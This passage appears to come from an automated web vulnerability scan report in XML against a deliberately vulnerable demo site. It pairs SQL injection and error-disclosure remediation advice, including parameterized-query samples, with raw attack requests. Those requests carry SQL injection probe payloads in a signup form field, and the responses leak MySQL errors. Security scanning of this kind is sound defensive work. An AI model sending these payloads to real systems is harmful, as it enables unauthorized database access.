Strict input validation can avoid most SQL injection attacks. Be sure to reject any data that does not match the expected format. This can be done with Validation controls or directly in your code. The most important aspect of avoiding SQL injection attacks is to always parameterize your queries to the database. This prevents user-supplied data from changing the syntax of the query.<br /><br />
In the code fragment below, a product ID is obtained from the HTTP query string, and used in a SQL query. Note how the string containing the “SELECT” statement passed to SqlCommand is simply a static string, and is not concatenated from input. Also note how the input parameter is passed using a SqlParameter object, whose name (“@pid”) matches the name used within the SQL query.<br /><br />
C# sample:<br /><br />
        string connString = WebConfigurationManager.ConnectionStrings["myConn"].ConnectionString;<br />
        using (SqlConnection conn = new SqlConnection(connString))<br />
        {<br />
            conn.Open();<br />

            SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn);<br />

            SqlParameter prm = new SqlParameter("@pid", SqlDbType.VarChar, 50);<br />
            prm.Value = Request.QueryString["pid"];<br />
            cmd.Parameters.Add(prm);<br />

            int recCount = (int)cmd.ExecuteScalar();<br />
        }<br /><br />


VB.NET sample:<br /><br />
        Dim connString As String = WebConfigurationManager.ConnectionStrings("myConn").ConnectionString<br />
        Using conn As New SqlConnection(connString)<br />
            conn.Open()<br />

            Dim cmd As SqlCommand = New SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn)<br />

            Dim prm As SqlParameter = New SqlParameter("@pid", SqlDbType.VarChar, 50)<br />
            prm.Value = Request.QueryString("pid")<br />
            cmd.Parameters.Add(prm)<br />

            Dim recCount As Integer = cmd.ExecuteScalar()<br />
        End Using<br /><br />

It is still useful and recommended to validate the contents of any input. But by using parameterized queries, even ridiculously incorrect inputs have no opportunity to alter the meaning of your SQL queries.]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText><![CDATA[<br /><b>SPI Dynamics Blind SQL Injection Whitepaper</b><br /><a href="http://www.spidynamics.com/support/whitepapers/Blind_SQLInjection.pdf">http://www.spidynamics.com/support/whitepapers/Blind_SQLInjection.pdf</a>]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />
SQL injection is caused by programming techniques that allow client-supplied values to interfere and modify SQL statement syntax. Thus, the best solution is to design and program Web applications in a manner that prevents client-supplied values from being treated as SQL syntax. The following recommendations can be used as a basis for that.
<ul><li>Stringently define the data type (a string, an alphanumeric character, etc.) that the application will accept. </li><li>Use what is good instead of what is bad. </li><li>Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be used in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, allow that field to accept only numbers. </li><li>Define the maximum and minimum data lengths that the application will accept. </li><li>Specify acceptable numeric ranges for input. </li></ul>
Strict input validation can avoid most SQL injection attacks. Be sure to reject any data that does not match the expected format. This can be done with validation controls or directly in your code. The most important aspect of avoiding SQL injection attacks is to always use prepared statements to query the database. This prevents user-supplied data from changing the syntax of the query. Thus, prepared statements help increase security by separating SQL logic from the data being supplied. <br /><br />
In the code sample below, an OrderID is obtained from the HTTP query string, and then used in a SQL query. Note how the string containing the “SELECT” statement passed to preparedStmt is simply a static string, and is not concatenated from input. Also note how the input parameter OrderID is passed, using a setString method, to replace the place holder ‘?’ that is used within the SQL query. <br /><br />
Connection con = DriverManager.getConnection(url, "user", "pass");
int OrderID; <br /><br />
// PreparedStatement precompiles a SQL statement expecting only arguments, preventing injection of SQL keywords. <br /><br />
PreparedStatement preparedStmt = con.prepareStatement( "SELECT * FROM Orders WHERE orderid = ?" ); <br /><br />
preparedStmt.setString( 1, OrderID ); <br /><br />
ResultSet rs = preparedStmt.executeQuery();]]></SectionText></ReportSection></Issue></Issues><RawRequest id="615093DB10A3FF8686262D3363F9F4DF"><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 235
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="615093DB10A3FF8686262D3363F9F4DF";PSID="553EDC90FC6DCEBD97AD652FC78258EB";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="5";AttackParamDesc="uuname";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="12345%2527%2509and%2509(select%2509count(*)%2509from%2509spitable)%253d1%2509or%2509%25271%2527%253d%25270%2509";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="ce39669b";
X-Request-Memo: ID="6d00391c";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

uuname=12345%27%09and%09(select%09count(*)%09from%09spitable)%3d1%09or%09%271%27%3d%270%09&upass=foo&upass2=foo&urname=12345&ucc=12345&uemail=John.Doe%40somewhere.com&uphone=12345&uaddress=1707%20Interdimensional%20Street&signup=signup]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:50:40 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 458

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	Unable to access user database: Table 'acuart.spitable' doesn't exist]]></RawResponse><Request id="615093DB10A3FF8686262D3363F9F4DF"><Method>POST</Method><Path>/secured/</Path><File>newuser</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uuname=12345%27%09and%09(select%09count(*)%09from%09spitable)%3d1%09or%09%271%27%3d%270%09&amp;upass=foo&amp;upass2=foo&amp;urname=12345&amp;ucc=12345&amp;uemail=John.Doe%40somewhere.com&amp;uphone=12345&amp;uaddress=1707%20Interdimensional%20Street&amp;signup=signup</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/signup.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>235</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="615093DB10A3FF8686262D3363F9F4DF";PSID="553EDC90FC6DCEBD97AD652FC78258EB";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="5";AttackParamDesc="uuname";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="12345%2527%2509and%2509(select%2509count(*)%2509from%2509spitable)%253d1%2509or%2509%25271%2527%253d%25270%2509";AttackStringProps="Attack";tid="40";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="29";smi="0";sc="1";ID="ce39669b";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="6d00391c";sc="1";tid="40";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	Unable to access user database: Table 'acuart.spitable' doesn't exist]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:50:40 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>458</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="1FFFD39F3409915C70091AB0D60BED69"><URL>http://php.vulnweb.com:80/secured/newuser.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>uuname</AttackParamDescriptor><Issues><Issue id="852e41b7-7bcd-49a8-8538-e1fd0bb1ac8b"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10026</EngineType><AttackHTTPRequest /><VulnerabilityID>742</VulnerabilityID><Severity>4</Severity><Name>Database Server Error Message</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="714" length="24" /><Location offset="782" length="20" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Critical database server error message vulnerabilities were identified in the web application, indicating that an unhandled exception was generated in your web application code. Unhandled exceptions are circumstances in which the application has received user input that it did not expect and does not know how to handle. When successfully exploited, an attacker can gain unauthorized  access to the database by using the information recovered from seemingly innocuous error messages to pinpoint flaws in the web application and to discover additional avenues of attack. Recommendations include designing and adding consistent error-handling mechanisms that are capable of handling any user input  to your web application, providing meaningful detail to end-users, and preventing error messages that might provide information useful to an attacker from being displayed. 

<br /><br /><b>Description</b><br /><br />


The most common cause of an unhandled exception is a failure to properly sanitize client-supplied data that is used in SQL statements. They can also be caused by a bug in the web application's database communication code, a misconfiguration of database connection settings, an unavailable database, or any other reason that would cause the application's database driver to be unable to establish a working session with the server. The problem is not that web applications generate errors.  All web applications in their normal course of operation will at some point receive an unhandled exception.  The problem lies not in that these errors were received, but rather in how they are handled. Any error handling solution needs to be well-designed, and uniform in how it handles errors.  For instance, assume an attacker is attempting to access a specific file. If the request returns an error File not Found, the attacker can be relatively sure the file does not exist.  However, if the error returns "Permission Denied," the attacker has a fairly good idea that the specific file does exist. This can be helpful to an attacker in many ways, from determining the operating system to discovering the underlying architecture and design of the application.

<br /><br />

The error message may also contain the location of the file that contains the offending function. This may disclose the webroot's absolute path as well as give  the attacker the location of application "include" files or database configuration information. A fundamental necessity for a successful attack upon your web application is reconnaissance. Database server error messages can provide information that can then be utilized when the attacker is formulating his next method of attack. It may even disclose the portion of code that failed.  

<br /><br />

Be aware that this check is part of unknown application testing which seeks to uncover new vulnerabilities in both custom and commercial software. Because of this, there are no specific patches or remediation information for this issue.  Please note that this vulnerability may be a false positive if the page it is flagged on is technical documentation relating to a database server.

]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />The severity of this vulnerability depends on the reason that the error message was generated.  In most cases, it will be the result of the web application 

attempting to use an invalid client-supplied argument in a SQL statement, which means that SQL injection will be possible. If so, an attacker will at least be able to read the contents of the entire database arbitrarily. Depending on the database server and the SQL statement, deleting, updating and adding records and executing arbitrary commands may also be possible. If a software bug or bug is responsible for triggering the error, the potential impact will vary, depending on the 

circumstances. 

The location of the application that caused the error can be useful in facilitating other kinds of attacks. If the file is a hidden or include file, the attacker may be able to gain more information about the mechanics of the web application, possibly even the source code. Application source code is likely to contain usernames, passwords, database connection strings and aids the attacker greatly in discovering new vulnerabilities.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
The information gleaned from database server error messages allows an attacker to conduct a successful attack after he combines his various findings. You can verify the database error response is highlighted in response tab. The ways in which an attacker can exploit the conditions that caused the error depend on its cause. In the case of SQL injection, the techniques that are used will vary from database server to database server, and even query to query. An overview SQL Injection attacks is available in the SQL Injection vulnerability information, accessible via the Policy Manager.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development: </b><br /><br />
From a development perspective, the best method of preventing problems from arising from database error messages is to adopt secure programming techniques that prevent problems that might arise from an attacker discovering too much information about the architecture and design of your web application. The following recommendations can be used as a basis for that. 


<ul><li>
Stringently define the data type (for instance, a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be utilized in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, only let that field accept numbers. </li><li>Define the maximum and minimum data lengths for what the application will accept. </li><li>Specify acceptable numeric ranges for input.</li></ul><b>For Security Operations: </b><br /><br />
The following recommendations will help in implementing a secure database protocol for your web application.   Be advised each database has its own method of  
secure lock down. <br /><br /><ul><li><b> ODBC Error Messaging:  </b>Turn off ODBC error messaging in your database server. Never display raw ODBC or other errors to the end user.  See Removing Detailed Error Messages below, or consult your database server's documentation, for more information. 


  </li><br /><li><b>Uniform Error Codes: </b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error  
messages.  For instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file  
he seeks actually exists.  Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied.  </li><br /><li><b>Informational Error Messages: </b> Ensure that error messages do not reveal too much information.  Complete or partial paths, variable and file names,  
row and column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information  
as possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><br /><li><b>Proper Error Handling: </b> Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system  
information or other data that could be utilized by an attacker when orchestrating an attack. </li><br /><li><b>Stored Procedures: </b> Consider using stored procedures. They require a very specific parameter format, which makes them less susceptible to SQL Injection  
attacks.  </li><br /><li><b>Database Privileges:  </b>  Utilize a least-privileges scheme for the database application.  Ensure that user accounts only have the limited functionality  
that is actually required.  All database mechanisms should deny access until it has been granted, not grant access until it has been denied. </li><br /></ul><br /><br /><b>For QA: </b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to cause internal errors to gauge the reaction of the site. If the unhandled exception occurs in a piece of in-house developed software, consult the developer. If it is in a commercial package, contact technical support.<br /><br />


The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker?]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Apache:</b><br /><a href="http://httpd.apache.org/docs/1.3/custom-error.html">Apache HTTP Server Version 1.3 Custom Error Responses</a><br /><a href="http://httpd.apache.org/docs/2.0/custom-error.html">Apache HTTP Server Version 2.0 Custom Error Responses</a><br /><br /><b>Microsoft:</b><br /><a href="http://support.microsoft.com/kb/318380">Description of Microsoft Internet Information Services (IIS) 5.0 and 6.0 status codes</a><br /><a href="https://vulncat.fortify.com/en/weakness?q=SQL%20Injection">SQL Injection</a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[The most common cause of an unhandled exception is a failure to properly sanitize client-supplied data that is used in SQL statements. They can also be caused by a bug in the web application's database communication code, a misconfiguration of database connection settings, an unavailable database, or any other reason that would cause the application's database driver to be unable to establish a working session with the server. The problem is not that web applications generate errors. All web applications in their normal course of operation will at some point receive an unhandled exception. The problem lies not in that these errors were received, but rather in how they are handled. Any error handling solution needs to be well-designed, and uniform in how it handles errors. For instance, assume an attacker is attempting to access a specific file. If the request returns an error File not Found, the attacker can be relatively sure the file does not exist. However, if the error returns "Permission Denied," the attacker has a fairly good idea that the specific file does exist. This can be helpful to an attacker in many ways, from determining the operating system to discovering the underlying architecture and design of the application. <br /><br />
The error message may also contain the location of the file that contains the offending function. This may disclose the webroot's absolute path as well as give the attacker the location of application "include" files or database configuration information. A fundamental necessity for a successful attack upon your web application is reconnaissance. Database server error messages can provide information that can then be utilized when the attacker is formulating his next method of attack. It may even disclose the portion of code that failed.<br /><br />
Please note that this vulnerability may be a false positive if the page it is flagged on is technical documentation relating to a database server.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[The severity of this vulnerability depends on the reason the error message was generated. In most cases, it will be the result of the web application attempting to use an invalid client-supplied argument in a SQL statement, which means that SQL injection will be possible. If so, an attacker will at least be able to read the contents of the entire database arbitrarily. Depending on the database server and the SQL statement, deleting, updating and adding records and executing arbitrary commands may also be possible. If a software bug is responsible for triggering the error, the potential impact will vary, depending on the circumstances. The location of the application that caused the error can be useful in facilitating other kinds of attacks. If the file is a hidden or include file, the attacker may be able to gain more information about the mechanics of the web application, possibly even the source code. Application source code is likely to contain usernames, passwords, database connection strings and aids the attacker greatly in discovering new vulnerabilities.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[The Probability Score ranks the likelihood of an attack when all factors of potential success are taken into consideration, such as the amount of expertise necessary to exploit the vulnerability, its ease of exploitation, and what mitigating factors could potentially increase or decrease its rate of success.  For instance, does this attack rely on acquiring other information or gaining specific access to be successful, or can it be exploited by itself?  Are there automated attack tools that can increase its effectiveness, such as with SQL Injection?  Is the vulnerability hard to find, ala a buffer overflow?  Are similar exploits well publicized?]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed immediately.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Custom error messages can be disabled via the ASP.NET Web Site Administration Tool.  Choose Website | ASP.NET Configuration from the Visual Studio 2005 menu to display it.  Then select the Application tab and click on “Define default error page”.  Select “Specify a URL” and choose a page within your project in the tree control.
<br /><br />
The corresponding elements of web.config are shown below.  The attribute “mode” should never be set to “Off”. Instead, choose “On” to always use custom errors or “RemoteOnly” to allow diagnosis of issues from the web server console.<br /><br />
&lt;configuration&gt;<br />
    &lt;system.web&gt;<br />
        &lt;customErrors mode="RemoteOnly" defaultRedirect="GenericErrorPage.htm"&gt;<br />
        &lt;/customErrors&gt;<br />
    &lt;/system.web&gt;<br />
&lt;/configuration&gt;
<br /><br />The attribute “defaultRedirect” should contain the relative URL of an error page.<br /><br />
Consult MSDN for additional options within this element.  For instance, you can specify different error pages based on the HTTP error code, such as 404 “Not Found”.<br /><br />

The best method of preventing problems that might arise from error messages is to adopt secure programming techniques that prevent an attacker from discovering too much information about the architecture and design of your web application. The following recommendations can be used as a basis for that. <br /><br /><ul><li>Stringently define the data type (for instance, a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be utilized in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, only let that field accept numbers. </li><li>Define the maximum and minimum data lengths for what the application will accept. </li><li>Specify acceptable numeric ranges for input </li></ul>Also, be sure that you have a consistent error handling mechanism that includes consideration of the following elements: <br /><br /><ul><li><b>Uniform Error Codes: </b>Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><li><b>Informational Error Messages: </b>Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><li><b>Proper Error Handling: </b>Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or other data that could be utilized by an attacker when orchestrating an attack.</li></ul>]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />
Custom error messages should be enabled in the deployment descriptor file for the Java 2 Platform, Enterprise Edition (J2EE) Web application. The “error-page” element of web.xml specifies a mapping between an error code or exception type to the path of an error page resource in the Web application. <br /><br />
The following example shows how a SQL Exception can be mapped to a custom general-error page called “errorPage.jsp” in web.xml: <br /><br />
&lt;error-page&gt;<br />
  &lt;exception-type&gt;java.lang.SQLException&lt;/exception-type&gt;<br />
  &lt;location&gt;/errorPage.jsp&lt;/location&gt;<br />
&lt;/error-page&gt;<br /><br />
The following example shows how an HTTP error code can be mapped to custom general error page called “errorPage.jsp” in web.xml: <br /><br />
&lt;error-page&gt;<br />
  &lt;error-code&gt;404&lt;/error-code&gt;<br />
  &lt;location&gt;/errorPage.jsp&lt;/location&gt;<br />
&lt;/error-page&gt;<br /><br />
To handle runtime exceptions within a JSP page, each page should specify a custom error page in page directive as shown below: <br /><br />
&lt;%@ page errorPage="errorPage.jsp" %&gt;<br /><br />
Within a Java servlet code, you can catch a SQL exception, throw a new generic exception, and forward the request to the error page to show a generic exception as shown below: <br /><br />
request.setAttribute("javax.servlet.jsp.jspException", new <br />
  Exception("Generic Error Message"));<br />
RequestDispatcher rd = <br />
  getServletContext().getRequestDispatcher("/errorPage.jsp");<br />
rd.forward(request, response); <br /><br />
The best method of preventing problems that arise from error messages is to adopt secure programming techniques that prevent an attacker from discovering too much information about the architecture and design of your Web application. The following recommendations can be used as a basis for that. 
<ul><li>Stringently define the data type (a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be used in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, allow that field to accept only numbers. </li><li>Define the maximum and minimum data lengths that the application will accept. </li><li>Specify acceptable numeric ranges for input </li></ul>
Also, be sure that you have a consistent error-handling mechanism that includes the following elements: 
<ul><li><b>Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><li><b>Informational Error Messages:</b> Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as possible, and then add pieces of seemingly innocuous information together to craft a method of attack. </li><li><b>Proper Error Handling:</b> Use generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or other data that could be used by an attacker when orchestrating an attack. </li></ul>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="1FFFD39F3409915C70091AB0D60BED69"><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 151
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="1FFFD39F3409915C70091AB0D60BED69";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="90d9e8a5-0000-41a1-8c96-3dc50c4050d0";AttackSequence="3";AttackParamDesc="uuname";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10247";Engine="Parameter+Injection+Engine";SmartMode="4";AttackString="%27";AttackStringProps="Attack";tid="55";tt="11";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="b7785944";
X-Request-Memo: ID="7d663c4d";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

uuname='&upass=foo&upass2=foo&urname=12345&ucc=12345&uemail=John.Doe%40somewhere.com&uphone=770&uaddress=1707%20Interdimensional%20Street&signup=signup]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:51:03 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 570

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	Unable to access user database: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1]]></RawResponse><Request id="1FFFD39F3409915C70091AB0D60BED69"><Method>POST</Method><Path>/secured/</Path><File>newuser</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uuname='&amp;upass=foo&amp;upass2=foo&amp;urname=12345&amp;ucc=12345&amp;uemail=John.Doe%40somewhere.com&amp;uphone=770&amp;uaddress=1707%20Interdimensional%20Street&amp;signup=signup</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/signup.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>151</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="1FFFD39F3409915C70091AB0D60BED69";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="90d9e8a5-0000-41a1-8c96-3dc50c4050d0";AttackSequence="3";AttackParamDesc="uuname";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10247";Engine="Parameter+Injection+Engine";SmartMode="4";AttackString="%27";AttackStringProps="Attack";tid="55";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="b7785944";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="7d663c4d";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
